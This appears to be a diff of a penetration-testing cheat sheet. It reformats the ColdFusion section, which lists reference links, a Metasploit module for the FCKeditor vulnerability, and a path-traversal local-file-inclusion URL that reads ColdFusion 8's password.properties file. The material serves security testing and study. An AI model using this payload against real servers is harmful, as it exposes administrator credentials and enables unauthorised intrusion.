@@ -48,7 +48,7 @@ Other Tools:
 	
 # Web app specific  
 ### Adobe Coldfusion 
-https://nets.ec/Coldfusion_hacking
+https://nets.ec/Coldfusion_hacking   
 https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8
 
     Metasploit - Determine version
@@ -56,7 +56,9 @@ https://www.drchaos.com/post/a-walk-down-adversary-lane-coldfusion-v8
     Version 8 Vulnerabilities
     Fckeditor: use exploit/windows/http/coldfusion_fckeditor
 
-LFI - http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+LFI 
+
+    http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 
 ### Elastix 
 
